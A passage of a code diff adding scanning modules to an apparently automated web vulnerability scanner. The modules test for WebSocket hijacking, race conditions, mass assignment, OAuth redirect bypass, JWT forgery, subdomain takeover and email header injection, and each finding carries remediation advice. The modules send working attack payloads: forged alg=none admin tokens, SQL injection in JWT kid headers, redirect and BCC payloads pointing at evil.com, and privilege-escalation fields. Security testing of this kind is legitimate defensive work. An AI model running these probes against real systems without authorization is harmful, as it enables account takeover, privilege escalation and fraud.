+                                "4. Configure CDN to strip attacker-controlled headers"),
+                        })
+                        vuln(f"Cache Poisoning via {list(phdr.keys())[0]}", "High")
+                        found = True
+                        break
+            except Exception:
+                pass
+
+        # Web Cache Deception test
+        # Access /account/nonexistent.css — static file extension tricks CDN into caching auth page
+        deception_paths = [
+            "/account/test.css","/profile/test.jpg","/dashboard/hack.js",
+            "/settings/evil.png","/api/user/style.css",
+        ]
+        for dpath in deception_paths:
+            try:
+                r1 = SESSION.get(_up(url).scheme+"://"+_up(url).netloc+dpath,
+                                  timeout=TIMEOUT, verify=False)
+                if r1.status_code == 200:
+                    resp_l = r1.text.lower()
+                    if any(s in resp_l for s in ["account","profile","email",
+                                                   "password","user","dashboard"]):
+                        rh = {k.lower():v for k,v in r1.headers.items()}
+                        if any(h in rh for h in ["cache-control","x-cache","age"]):
+                            add("cache_poison", {
+                                "type": "Web Cache Deception",
+                                "severity": "High",
+                                "url": _up(url).scheme+"://"+_up(url).netloc+dpath,
+                                "detail": f"Authenticated page content accessible via static-looking path '{dpath}' and may be cached — attackers can steal other users' session data",
+                                "remediation": (
+                                    "1. Cache only on Content-Type, not URL extension\n"
+                                    "2. Set Cache-Control: no-store on authenticated pages\n"
+                                    "3. Validate that cached paths match application routes"),
+                            })
+                            vuln(f"Web Cache Deception: {dpath}", "High")
+                            found = True
+                            break
+            except Exception:
+                pass
+
+    except Exception as _e:
+        warn(f"Cache Poisoning error: {_e}")
+
+    if not found:
+        good("Cache Poisoning: No cache poisoning vulnerability found")
+    _module_done("cache_poison")
+
+
+# ═══ MODULE 127 — WEBSOCKET SECURITY (v15.0) ══════════════════════
+def websocket_security_scan(url):
+    """MODULE 127 — WebSocket security: CSWSH, injection, hijacking."""
+    if _module_skip("websocket"):
+        info("Skipping WebSocket Security (already done)"); return
+    section("MODULE 127 — WEBSOCKET SECURITY","🔌")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    ws_base = base.replace("https://","wss://").replace("http://","ws://")
+    found  = False
+
+    # Common WS endpoints
+    ws_paths = ["/ws","/websocket","/socket","/chat","/live",
+                "/realtime","/events","/stream","/api/ws","/io"]
+
+    # Check if WebSocket upgrade is possible
+    ws_found_endpoints = []
+    for path in ws_paths:
+        try:
+            r = SESSION.get(base+path, timeout=TIMEOUT, verify=False,
+                           headers={"Upgrade":"websocket","Connection":"Upgrade",
+                                    "Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==",
+                                    "Sec-WebSocket-Version":"13"})
+            if r.status_code in (101, 200, 400, 426):
+                ws_found_endpoints.append(base+path)
+                info(f"  WebSocket: potential endpoint {base+path} (HTTP {r.status_code})")
+        except Exception:
+            pass
+
+    # Also scan page source for ws:// / wss:// URLs
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        ws_urls = re.findall(r'["\']?(wss?://[^"\'>\s]+)["\']?', r.text)
+        for wu in ws_urls:
+            ws_found_endpoints.append(wu)
+            info(f"  WebSocket URL found in source: {wu}")
+    except Exception:
+        pass
+
+    ws_found_endpoints = list(set(ws_found_endpoints))
+
+    if not ws_found_endpoints:
+        good("WebSocket: No WebSocket endpoints detected")
+        _module_done("websocket"); return
+
+    # Test Cross-Site WebSocket Hijacking (CSWSH)
+    for ep in ws_found_endpoints[:3]:
+        try:
+            # Test: Can we connect with a cross-origin Origin header?
+            r = SESSION.get(ep.replace("ws://","http://").replace("wss://","https://"),
+                           timeout=TIMEOUT, verify=False,
+                           headers={"Origin": "https://evil.com",
+                                    "Upgrade": "websocket",
+                                    "Connection": "Upgrade",
+                                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                                    "Sec-WebSocket-Version": "13"})
+            if r.status_code == 101:
+                add("websocket", {
+                    "type": "Cross-Site WebSocket Hijacking (CSWSH)",
+                    "severity": "High",
+                    "url": ep,
+                    "detail": (
+                        f"WebSocket at {ep} accepts connections from arbitrary origins "
+                        "(Origin: evil.com accepted). Attacker can read/send messages as victim."),
+                    "remediation": (
+                        "1. Validate Origin header on WebSocket handshake\n"
+                        "2. Only accept connections from trusted origins\n"
+                        "3. Use CSRF tokens in WebSocket connection URL\n"
+                        "4. Implement proper WebSocket authentication"),
+                })
+                vuln(f"CSWSH at {ep}", "High")
+                found = True
+
+            # Check if no authentication on WS endpoint
+            if r.status_code not in (401, 403):
+                add("websocket", {
+                    "type": "Unauthenticated WebSocket Endpoint",
+                    "severity": "Medium",
+                    "url": ep,
+                    "detail": f"WebSocket endpoint {ep} accessible without authentication",
+                    "remediation": "Require authentication before WebSocket upgrade. Validate session cookies on handshake.",
+                })
+                found = True
+
+        except Exception:
+            pass
+
+    # WS injection payloads (send to any ws endpoint found in source)
+    ws_injection_payloads = [
+        '{"type":"subscribe","channel":"../admin"}',
+        '{"user":"admin","cmd":"exec","args":"id"}',
+        '<script>alert(1)</script>',
+        '{"__proto__":{"admin":true}}',
+        '{"type":"message","data":"\'OR\'1\'=\'1"}',
+    ]
+    if ws_found_endpoints:
+        add("websocket", {
+            "type": "WebSocket Endpoints Detected",
+            "severity": "Info",
+            "url": ws_found_endpoints[0],
+            "endpoints": ws_found_endpoints[:5],
+            "detail": f"WebSocket endpoints found: {ws_found_endpoints[:5]}. Manual injection testing recommended with ws-harness or Burp Suite.",
+            "injection_payloads": ws_injection_payloads[:3],
+            "remediation": "Validate all WebSocket message input. Apply same security controls as HTTP endpoints.",
+        })
+
+    if not found:
+        good("WebSocket: Endpoints found but no critical vulnerabilities detected")
+    _module_done("websocket")
+
+
+# ═══ MODULE 128 — RACE CONDITION (v15.0) ══════════════════════════
+def race_condition_scan(url):
+    """MODULE 128 — Race condition detection via parallel requests."""
+    if _module_skip("race_condition"):
+        info("Skipping Race Condition (already done)"); return
+    section("MODULE 128 — RACE CONDITION","🏁")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    # Endpoints likely to have race conditions
+    race_targets = [
+        (base+"/api/coupon/apply",    {"code":"SAVE10","user_id":"1"}),
+        (base+"/api/gift/redeem",     {"code":"GIFT123"}),
+        (base+"/api/vote",            {"item_id":"1"}),
+        (base+"/api/like",            {"post_id":"1"}),
+        (base+"/api/checkout",        {"cart_id":"1"}),
+        (base+"/api/transfer",        {"amount":"100","to":"attacker"}),
+        (base+"/api/signup/bonus",    {"user_id":"1"}),
+        (base+"/api/referral/claim",  {"code":"REF123"}),
+    ]
+
+    def _parallel_post(ep, data, n=15):
+        """Send N parallel requests simultaneously."""
+        import threading
+        results = []
+        lock    = threading.Lock()
+
+        def _do():
+            try:
+                r = SESSION.post(ep, json=data, timeout=TIMEOUT, verify=False)
+                with lock:
+                    results.append((r.status_code, r.text[:200]))
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=_do) for _ in range(n)]
+        # Start all threads simultaneously (as close as possible)
+        for t in threads: t.daemon = True
+        for t in threads: t.start()
+        for t in threads: t.join(timeout=TIMEOUT+2)
+        return results
+
+    for ep, payload in race_targets:
+        try:
+            # First check if endpoint exists
+            check = SESSION.post(ep, json=payload, timeout=TIMEOUT, verify=False)
+            if check.status_code not in (200, 201, 400, 422, 429): continue
+
+            info(f"  Race: testing {ep}...")
+            results = _parallel_post(ep, payload, n=15)
+            if not results: continue
+
+            # Analyze results for race condition signs
+            statuses   = [r[0] for r in results]
+            success_ct = sum(1 for s in statuses if s in (200, 201))
+            resp_texts  = [r[1].lower() for r in results]
+
+            # Multiple successes = potential race condition (should only succeed once)
+            success_signs = ["success","applied","redeemed","credited","ok","true","bonus","claimed"]
+            success_responses = sum(1 for t in resp_texts
+                                    if any(s in t for s in success_signs))
+
+            if success_responses > 1:
+                add("race_condition", {
+                    "type": "Race Condition",
+                    "severity": "High",
+                    "url": ep,
+                    "parallel_requests": 15,
+                    "success_responses": success_responses,
+                    "detail": (
+                        f"Race condition at {ep}: {success_responses}/15 parallel requests succeeded "
+                        f"where only 1 should. Attackers can apply coupons multiple times, "
+                        "claim bonuses repeatedly, or double-spend funds."),
+                    "remediation": (
+                        "1. Use database-level atomic operations (SELECT FOR UPDATE)\n"
+                        "2. Implement idempotency keys on all state-changing operations\n"
+                        "3. Use Redis SETNX for distributed locks\n"
+                        "4. Apply request rate limiting per user per endpoint\n"
+                        "5. Validate state before and inside a database transaction"),
+                })
+                vuln(f"Race Condition at {ep} — {success_responses}/15 parallel requests succeeded", "High")
+                found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("Race Condition: No race conditions detected")
+    _module_done("race_condition")
+
+
+# ═══ MODULE 129 — MASS ASSIGNMENT (v15.0) ═════════════════════════
+def mass_assignment_scan(url):
+    """MODULE 129 — Mass assignment / over-posting vulnerability detection."""
+    if _module_skip("mass_assign"):
+        info("Skipping Mass Assignment (already done)"); return
+    section("MODULE 129 — MASS ASSIGNMENT / OVER-POSTING","📋")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    api_endpoints = [
+        (base+"/api/users/profile",   "PUT"),
+        (base+"/api/user",            "PUT"),
+        (base+"/api/account",         "PUT"),
+        (base+"/api/users/update",    "POST"),
+        (base+"/api/register",        "POST"),
+        (base+"/api/signup",          "POST"),
+        (base+"/api/profile",         "PATCH"),
+    ]
+
+    # Privileged fields that should NOT be mass-assignable
+    privileged_payloads = [
+        {"role": "admin"},
+        {"is_admin": True},
+        {"admin": True},
+        {"is_verified": True},
+        {"email_verified": True},
+        {"balance": 99999},
+        {"credits": 99999},
+        {"plan": "enterprise"},
+        {"subscription": "premium"},
+        {"permissions": ["read","write","delete","admin"]},
+        {"user_level": 9},
+        {"account_type": "admin"},
+        {"verified": True},
+        {"banned": False},
+        {"is_staff": True},
+        {"is_superuser": True},
+        {"two_factor_enabled": False},
+    ]
+
+    hdrs = {"Content-Type":"application/json","Accept":"application/json"}
+
+    for ep, method in api_endpoints:
+        try:
+            for payload in privileged_payloads:
+                try:
+                    if method == "PUT":
+                        r = SESSION.put(ep, json=payload, headers=hdrs,
+                                        timeout=TIMEOUT, verify=False)
+                    elif method == "PATCH":
+                        r = SESSION.patch(ep, json=payload, headers=hdrs,
+                                          timeout=TIMEOUT, verify=False)
+                    else:
+                        r = SESSION.post(ep, json=payload, headers=hdrs,
+                                         timeout=TIMEOUT, verify=False)
+
+                    if r.status_code in (200, 201):
+                        resp_l = r.text.lower()
+                        for field, value in payload.items():
+                            if str(value).lower() in resp_l or field in resp_l:
+                                add("mass_assign", {
+                                    "type": "Mass Assignment / Over-posting",
+                                    "severity": "High",
+                                    "url": ep,
+                                    "method": method,
+                                    "payload": payload,
+                                    "detail": (
+                                        f"Server accepted privileged field '{field}={value}' via {method} {ep}. "
+                                        "Attacker may escalate privileges or manipulate account properties."),
+                                    "remediation": (
+                                        "1. Use allowlist (not denylist) for accepted fields\n"
+                                        "2. Use DTOs/serializers that explicitly define accepted fields\n"
+                                        "3. Never bind request data directly to model objects\n"
+                                        "4. Mark sensitive model fields as readonly"),
+                                })
+                                vuln(f"Mass Assignment [{field}={value}] at {ep}", "High")
+                                found = True
+                                break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    if not found:
+        good("Mass Assignment: No over-posting vulnerability found")
+    _module_done("mass_assign")
+
+
+# ═══ MODULE 130 — HTTP PARAMETER POLLUTION (v15.0) ════════════════
+def http_parameter_pollution_scan(url):
+    """MODULE 130 — HTTP Parameter Pollution (HPP) detection."""
+    if _module_skip("hpp"):
+        info("Skipping HTTP Parameter Pollution (already done)"); return
+    section("MODULE 130 — HTTP PARAMETER POLLUTION","🔀")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+
+    if not params:
+        # Try common params
+        params = {"id":["1"],"user":["admin"],"action":["view"],"page":["1"]}
+
+    # Test HPP by duplicating params with different values
+    for pname in list(params.keys())[:3]:
+        orig_val = params[pname][0]
+        # Send duplicate param — server behavior varies:
+        # Some use first, some use last, some concatenate
+        test_cases = [
+            # (description, url_suffix)
+            (f"Duplicate param — first=legit, second=injected",
+             f"{base}{parsed.path}?{pname}={orig_val}&{pname}=injected_hpp_value"),
+            (f"Duplicate param — first=injected, second=legit",
+             f"{base}{parsed.path}?{pname}=injected_hpp_value&{pname}={orig_val}"),
+            (f"Array param pollution",
+             f"{base}{parsed.path}?{pname}[]={orig_val}&{pname}[]=injected"),
+        ]
+
+        try:
+            # Baseline
+            r0 = SESSION.get(f"{base}{parsed.path}?{pname}={orig_val}",
+                             timeout=TIMEOUT, verify=False)
+            baseline_text = r0.text
+
+            for desc, test_url in test_cases:
+                r = SESSION.get(test_url, timeout=TIMEOUT, verify=False)
+                # If injected value appears in response — HPP reflected
+                if "injected_hpp_value" in r.text and "injected_hpp_value" not in baseline_text:
+                    add("hpp", {
+                        "type": "HTTP Parameter Pollution",
+                        "severity": "Medium",
+                        "url": test_url,
+                        "param": pname,
+                        "detail": f"HPP: {desc}. Injected param value reflected — may bypass filters or override logic.",
+                        "remediation": (
+                            "1. Explicitly define expected parameters and types\n"
+                            "2. Reject or ignore duplicate parameters\n"
+                            "3. Use framework's param parsing consistently\n"
+                            "4. Normalize parameter handling across front-end and back-end"),
+                    })
+                    vuln(f"HTTP Parameter Pollution — param '{pname}'", "Medium")
+                    found = True
+                    break
+                # If response differs significantly from baseline (behavior changed)
+                elif abs(len(r.text) - len(baseline_text)) > 500:
+                    add("hpp", {
+                        "type": "HTTP Parameter Pollution (Behavior Change)",
+                        "severity": "Low",
+                        "url": test_url,
+                        "param": pname,
+                        "detail": f"HPP with param '{pname}' changes response significantly — potential logic bypass",
+                        "remediation": "Handle duplicate parameters consistently and explicitly.",
+                    })
+                    found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("HTTP Parameter Pollution: No HPP vulnerability found")
+    _module_done("hpp")
+
+
+# ═══ MODULE 131 — OAUTH 2.0 / OIDC MISCONFIGURATION (v15.0) ═══════
+def oauth_oidc_scan(url):
+    """MODULE 131 — OAuth 2.0 and OIDC misconfiguration detection."""
+    if _module_skip("oauth_oidc"):
+        info("Skipping OAuth/OIDC (already done)"); return
+    section("MODULE 131 — OAUTH 2.0 / OIDC MISCONFIGURATION","🔐")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    # Discover OAuth endpoints
+    discovery_paths = [
+        "/.well-known/openid-configuration",
+        "/.well-known/oauth-authorization-server",
+        "/oauth/authorize","/oauth/token","/oauth2/authorize","/oauth2/token",
+        "/auth/oauth/v2/authorize","/api/oauth/authorize",
+        "/connect/authorize","/connect/token","/identity/connect/authorize",
+    ]
+
+    oauth_config = {}
+    auth_endpoint = None
+    token_endpoint = None
+
+    for path in discovery_paths:
+        try:
+            r = SESSION.get(base+path, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                ct = r.headers.get("content-type","").lower()
+                if "json" in ct:
+                    try:
+                        cfg = json.loads(r.text)
+                        oauth_config = cfg
+                        auth_endpoint  = cfg.get("authorization_endpoint","")
+                        token_endpoint = cfg.get("token_endpoint","")
+                        info(f"  OAuth: discovery at {base+path}")
+                        # Check for PKCE requirement
+                        pkce_required = cfg.get("code_challenge_methods_supported")
+                        if not pkce_required:
+                            add("oauth_oidc", {
+                                "type": "OAuth: PKCE Not Enforced",
+                                "severity": "Medium",
+                                "url": base+path,
+                                "detail": "OAuth server does not advertise PKCE support — authorization code interception attacks possible",
+                                "remediation": "Enforce PKCE (S256) for all public clients. Set code_challenge_methods_supported.",
+                            })
+                            found = True
+                    except Exception:
+                        pass
+                # Check for OAuth authorize endpoint
+                elif r.status_code == 200 and "oauth" in path:
+                    auth_endpoint = base + path
+        except Exception:
+            pass
+
+    if auth_endpoint:
+        # Test redirect_uri bypass
+        redirect_bypasses = [
+            "https://evil.com",
+            "https://evil.com/callback",
+            f"https://{parsed.netloc}.evil.com",
+            f"https://{parsed.netloc}@evil.com",
+            "javascript:alert(1)",
+            "//evil.com",
+            f"https://{parsed.netloc}/callback?next=https://evil.com",
+        ]
+        for ruri in redirect_bypasses:
+            try:
+                test_url = (f"{auth_endpoint}?response_type=code"
+                            f"&client_id=test&redirect_uri={_ue(ruri)}"
+                            f"&scope=openid&state=csrf_test")
+                r = SESSION.get(test_url, timeout=TIMEOUT, verify=False,
+                               allow_redirects=False)
+                loc = r.headers.get("location","")
+                if "evil.com" in loc or ruri in loc:
+                    add("oauth_oidc", {
+                        "type": "OAuth redirect_uri Bypass",
+                        "severity": "Critical",
+                        "url": test_url,
+                        "redirect_uri": ruri,
+                        "detail": f"OAuth server accepted redirect_uri='{ruri}' — attacker can steal authorization codes via open redirect",
+                        "remediation": (
+                            "1. Strictly validate redirect_uri against registered allowlist\n"
+                            "2. Use exact string match (not prefix/suffix matching)\n"
+                            "3. Reject any URL not registered at client registration\n"
+                            "4. Enforce PKCE to mitigate code interception"),
+                    })
+                    vuln(f"OAuth redirect_uri bypass: {ruri}", "Critical")
+                    found = True
+                    break
+            except Exception:
+                pass
+
+        # Test state parameter CSRF
+        try:
+            # Send auth request without state
+            test_url = (f"{auth_endpoint}?response_type=code"
+                        f"&client_id=test&redirect_uri={base}/callback&scope=openid")
+            r = SESSION.get(test_url, timeout=TIMEOUT, verify=False,
+                           allow_redirects=False)
+            if r.status_code in (200, 302):
+                add("oauth_oidc", {
+                    "type": "OAuth: Missing state Parameter (CSRF)",
+                    "severity": "High",
+                    "url": test_url,
+                    "detail": "OAuth authorization accepted without state parameter — CSRF attacks on OAuth flow possible",
+                    "remediation": "Require and validate state parameter. Use cryptographically random, session-bound state values.",
+                })
+                vuln("OAuth missing state parameter (CSRF risk)", "High")
+                found = True
+        except Exception:
+            pass
+
+    if not found and not oauth_config:
+        good("OAuth/OIDC: No OAuth endpoints found")
+    elif not found:
+        good("OAuth/OIDC: Endpoints found but no critical misconfigurations")
+    _module_done("oauth_oidc")
+
+
+# ═══ MODULE 132 — JWT ALGORITHM CONFUSION (v15.0) ═════════════════
+def jwt_algorithm_confusion_scan(url):
+    """MODULE 132 — JWT: alg=none, RS256→HS256 confusion, kid injection."""
+    if _module_skip("jwt_confusion"):
+        info("Skipping JWT Algorithm Confusion (already done)"); return
+    section("MODULE 132 — JWT ALGORITHM CONFUSION","🔑")
+    found = False
+
+    # Try to get a JWT from the target
+    tokens_found = []
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        # Look for JWTs in cookies
+        for name, val in SESSION.cookies.items():
+            if val.count(".") == 2 and len(val) > 50:
+                tokens_found.append(("cookie:"+name, val))
+        # Look for JWTs in response headers
+        for hname, hval in r.headers.items():
+            if hval.count(".") == 2 and len(hval) > 50:
+                tokens_found.append(("header:"+hname, hval))
+        # Look for JWTs in response body (JSON)
+        try:
+            body = json.loads(r.text)
+            for key in ["token","access_token","jwt","id_token","refresh_token"]:
+                if key in body and isinstance(body[key], str) and body[key].count(".") == 2:
+                    tokens_found.append((f"body:{key}", body[key]))
+        except Exception:
+            pass
+        # Look in auth-related endpoints
+        for ep in ["/api/token","/api/auth","/api/login","/api/jwt"]:
+            try:
+                rt = SESSION.post(_up(url).scheme+"://"+_up(url).netloc+ep,
+                                  json={"username":"test","password":"test"},
+                                  timeout=TIMEOUT, verify=False)
+                try:
+                    bd = json.loads(rt.text)
+                    for key in ["token","access_token","jwt"]:
+                        if key in bd and str(bd[key]).count(".") == 2:
+                            tokens_found.append((f"login:{key}", str(bd[key])))
+                except Exception:
+                    pass
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    if not tokens_found:
+        good("JWT: No JWT tokens found to test")
+        _module_done("jwt_confusion"); return
+
+    info(f"JWT: found {len(tokens_found)} token(s)")
+
+    for source, token in tokens_found[:3]:
+        try:
+            import base64 as _b64
+
+            def _b64d(s):
+                s += "=="*((4-len(s)%4)%4)
+                try: return json.loads(_b64.urlsafe_b64decode(s).decode())
+                except Exception: return {}
+
+            parts = token.split(".")
+            if len(parts) != 3: continue
+            header  = _b64d(parts[0])
+            payload = _b64d(parts[1])
+            info(f"  JWT [{source}] alg={header.get('alg','?')} sub={payload.get('sub','?')}")
+
+            # Test 1: alg=none attack
+            none_header  = _b64.urlsafe_b64encode(
+                json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
+            # Modify payload — escalate privileges
+            test_payload = dict(payload)
+            test_payload["role"]   = "admin"
+            test_payload["admin"]  = True
+            test_payload["is_admin"] = True
+            none_payload = _b64.urlsafe_b64encode(
+                json.dumps(test_payload).encode()).rstrip(b"=").decode()
+            none_token = f"{none_header}.{none_payload}."  # Empty signature
+
+            # Try the none-alg token
+            test_ep = url
+            r_none = SESSION.get(test_ep, timeout=TIMEOUT, verify=False,
+                                  headers={"Authorization": f"Bearer {none_token}"})
+            if r_none.status_code == 200:
+                resp_l = r_none.text.lower()
+                if any(s in resp_l for s in ["admin","profile","account","success","user"]):
+                    add("jwt_confusion", {
+                        "type": "JWT Algorithm None Attack",
+                        "severity": "Critical",
+                        "url": test_ep,
+                        "source": source,
+                        "detail": "Server accepted JWT with alg=none and no signature — anyone can forge arbitrary tokens",
+                        "remediation": (
+                            "1. Explicitly whitelist allowed algorithms (HS256, RS256)\n"
+                            "2. Never accept alg=none\n"
+                            "3. Use a JWT library that rejects none by default\n"
+                            "4. Validate algorithm before verifying signature"),
+                    })
+                    vuln("JWT alg=none accepted — tokens can be forged!", "Critical")
+                    found = True
+
+            # Test 2: kid header injection (SQL / path traversal)
+            kid_payloads = [
+                "../../dev/null",           # Path traversal — empty key
+                "' UNION SELECT 'secret'--", # SQL injection in kid
+                "/dev/null",
+            ]
+            for kid in kid_payloads:
+                kid_header = _b64.urlsafe_b64encode(
+                    json.dumps({"alg":"HS256","typ":"JWT","kid":kid}).encode()
+                ).rstrip(b"=").decode()
+                kid_token = f"{kid_header}.{none_payload}.c2VjcmV0"
+                try:
+                    r_kid = SESSION.get(test_ep, timeout=TIMEOUT, verify=False,
+                                        headers={"Authorization":f"Bearer {kid_token}"})
+                    if r_kid.status_code not in (401, 403):
+                        add("jwt_confusion", {
+                            "type": "JWT kid Header Injection",
+                            "severity": "High",
+                            "url": test_ep,
+                            "kid": kid,
+                            "detail": f"JWT kid='{kid}' not rejected — may allow path traversal or SQL injection in key lookup",
+                            "remediation": "Validate and sanitize kid header value. Use a fixed allowlist of key IDs.",
+                        })
+                        vuln(f"JWT kid injection: kid='{kid}'", "High")
+                        found = True
+                        break
+                except Exception:
+                    pass
+
+        except Exception as _e:
+            pass
+
+    if not found:
+        good("JWT: No algorithm confusion vulnerabilities found")
+    _module_done("jwt_confusion")
+
+
+# ═══ MODULE 133 — SUBDOMAIN TAKEOVER (v15.0) ══════════════════════
+def subdomain_takeover_scan(url):
+    """MODULE 133 — Subdomain takeover: dangling DNS to unclaimed services."""
+    if _module_skip("sub_takeover"):
+        info("Skipping Subdomain Takeover (already done)"); return
+    section("MODULE 133 — SUBDOMAIN TAKEOVER","🌐")
+    parsed = _up(url)
+    host   = parsed.netloc.split(":")[0]
+    # Get base domain
+    parts = host.split(".")
+    if len(parts) > 2:
+        base_domain = ".".join(parts[-2:])
+    else:
+        base_domain = host
+    found  = False
+
+    # Fingerprints for takeover-vulnerable services
+    takeover_fingerprints = {
+        "github.io":          "There isn't a GitHub Pages site here",
+        "amazonaws.com":      ["NoSuchBucket","The specified bucket does not exist"],
+        "s3.amazonaws.com":   ["NoSuchBucket"],
+        "cloudfront.net":     "Bad request",
+        "heroku.com":         "No such app",
+        "herokudns.com":      "No such app",
+        "azurewebsites.net":  "404 Web Site not found",
+        "azure.com":          "404 - web app not found",
+        "fastly.net":         "Fastly error",
+        "shopify.com":        "Sorry, this shop is currently unavailable",
+        "shopifypreview.com": "Sorry, this shop is currently unavailable",
+        "zendesk.com":        "Help Center Closed",
+        "ghost.io":           "Failed to load resource",
+        "bitbucket.io":       "Repository not found",
+        "pantheon.io":        "The gods are smiling upon you",
+        "unbouncepages.com":  "The requested URL was not found",
+        "surge.sh":           "project not found",
+        "netlify.com":        "Not Found - Request ID",
+        "readme.io":          "Project doesnt exist",
+        "readthedocs.io":     "Project not found",
+        "feedpress.me":       "The feed has not been found",
+        "statuspage.io":      "You are being redirected",
+        "tilda.ws":           "Please renew your subscription",
+        "mailchimp.com":      "Invalid Mailchimp List ID",
+        "smugmug.com":        "SmugMug",
+        "campaignmonitor.com":"Trying to access your account",
+        "cargocollective.com":"If you're the owner of this website",
+        "launchrock.com":     "It looks like you may have taken a wrong turn",
+    }
+
+    # Get CNAME chain for the main domain and common subdomains
+    test_subs = [
+        f"www.{base_domain}", f"mail.{base_domain}", f"dev.{base_domain}",
+        f"staging.{base_domain}", f"beta.{base_domain}", f"app.{base_domain}",
+        f"api.{base_domain}", f"cdn.{base_domain}", f"static.{base_domain}",
+        f"assets.{base_domain}", f"media.{base_domain}", f"help.{base_domain}",
+        f"support.{base_domain}", f"docs.{base_domain}", f"blog.{base_domain}",
+        f"shop.{base_domain}", f"store.{base_domain}", f"admin.{base_domain}",
+    ]
+
+    for sub in test_subs:
+        try:
+            # DNS CNAME lookup
+            import subprocess as _sp
+            result = _sp.run(["dig", "+short", "CNAME", sub],
+                             capture_output=True, text=True, timeout=5)
+            cname = result.stdout.strip().lower()
+            if not cname:
+                # Try A record + compare
+                result_a = _sp.run(["dig", "+short", "A", sub],
+                                   capture_output=True, text=True, timeout=5)
+                if not result_a.stdout.strip():
+                    continue
+            # Check if CNAME points to a vulnerable service
+            for svc_domain, fingerprint in takeover_fingerprints.items():
+                if svc_domain in cname:
+                    # Try to fetch the subdomain
+                    try:
+                        r = SESSION.get(f"https://{sub}", timeout=TIMEOUT, verify=False)
+                        resp_text = r.text
+                        fps = fingerprint if isinstance(fingerprint, list) else [fingerprint]
+                        if any(fp.lower() in resp_text.lower() for fp in fps):
+                            add("sub_takeover", {
+                                "type": "Subdomain Takeover",
+                                "severity": "High",
+                                "url": f"https://{sub}",
+                                "subdomain": sub,
+                                "cname": cname,
+                                "service": svc_domain,
+                                "detail": (
+                                    f"{sub} → CNAME → {cname} ({svc_domain}) — "
+                                    f"service shows '{fps[0][:50]}'. "
+                                    "Attacker can claim this service and serve content on your subdomain."),
+                                "remediation": (
+                                    f"1. Remove DNS CNAME for {sub} if the service is decommissioned\n"
+                                    f"2. Or re-claim the resource on {svc_domain}\n"
+                                    "3. Audit all subdomains regularly\n"
+                                    "4. Use automated subdomain monitoring"),
+                            })
+                            vuln(f"Subdomain Takeover: {sub} → {svc_domain}", "High")
+                            found = True
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+
+    if not found:
+        good("Subdomain Takeover: No dangling subdomains found")
+    _module_done("sub_takeover")
+
+
+# ═══ MODULE 134 — EMAIL HEADER INJECTION (v15.0) ══════════════════
+def email_header_injection_scan(url):
+    """MODULE 134 — Email header injection via contact/registration forms."""
+    if _module_skip("email_inject"):
+        info("Skipping Email Header Injection (already done)"); return
+    section("MODULE 134 — EMAIL HEADER INJECTION","✉")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    form_paths = ["/contact","/contact-us","/support","/feedback",
+                  "/help","/mail","/email","/inquiry","/message","/report"]
+
+    # Email injection payloads
+    payloads = [
+        ("test@test.com\nCC: injected@evil.com",          "CRLF CC injection"),
+        ("test@test.com\r\nBCC: spy@evil.com",            "CRLF BCC injection"),
+        ("test@test.com%0aBCC:spy@evil.com",              "URL-encoded newline BCC"),
+        ("test@test.com%0d%0aCC:injected@evil.com",       "URL-encoded CRLF CC"),
+        ("test@test.com\nContent-Type: text/html",        "Content-Type injection"),
+        ('"test@test.com"\r\nCC:test2@evil.com',          "Quoted CRLF"),
+        ("test%40evil.com%0a%0d",                         "Double CRLF encoded"),
+    ]
+
+    for path in form_paths:
+        ep = base + path
+        try:
+            # GET to find form
+            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r.status_code != 200: continue
+            page_l = r.text.lower()
+            if not any(s in page_l for s in ["email","contact","message","name","subject"]):
+                continue
+            # Form found
+            for payload, desc in payloads:
+                try:
+                    pr = SESSION.post(ep, data={
+                        "email":   payload,
+                        "name":    "Test User",
+                        "subject": "Test",
+                        "message": "Test message",
+                        "body":    "Test message",
+                    }, timeout=TIMEOUT, verify=False)
+                    resp_l = pr.text.lower()
+                    # Success without error (email likely sent with injected headers)
+                    if pr.status_code in (200, 302) and not any(
+                            s in resp_l for s in ["invalid","error","failed","invalid email"]):
+                        add("email_inject", {
+                            "type": "Email Header Injection",
+                            "severity": "Medium",
+                            "url": ep,
+                            "payload": payload,
+                            "detail": f"Email form at {ep} accepted header-injection payload ({desc}) without rejection — attacker can add CC/BCC to spam or phish victims via your server",
+                            "remediation": (
+                                "1. Validate email fields: reject newlines (\\r, \\n)\n"
+                                "2. Use email library's safe header functions\n"
+                                "3. Whitelist allowed characters in name/subject fields\n"
+                                "4. Never interpolate user input directly into email headers"),
+                        })
+                        vuln(f"Email Header Injection at {ep} — {desc}", "Medium")
+                        found = True
+                        break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    if not found:
+        good("Email Header Injection: No injection found")
+    _module_done("email_inject")
+
+
+# ═══ MODULE 135 — CLOUD STORAGE MISCONFIGURATION (v15.0) ══════════
+def cloud_storage_scan(url):
+    """MODULE 135 — AWS S3, GCS, Azure Blob public bucket detection."""
+    if _module_skip("cloud_storage"):
+        info("Skipping Cloud Storage (already done)"); return
+    section("MODULE 135 — CLOUD STORAGE MISCONFIGURATION","☁")
+    parsed = _up(url)
+    host   = parsed.netloc.split(":")[0]
+    # Derive bucket name guesses from domain
+    parts = host.replace("www.","").split(".")
+    org   = parts[0]
+    found = False
+
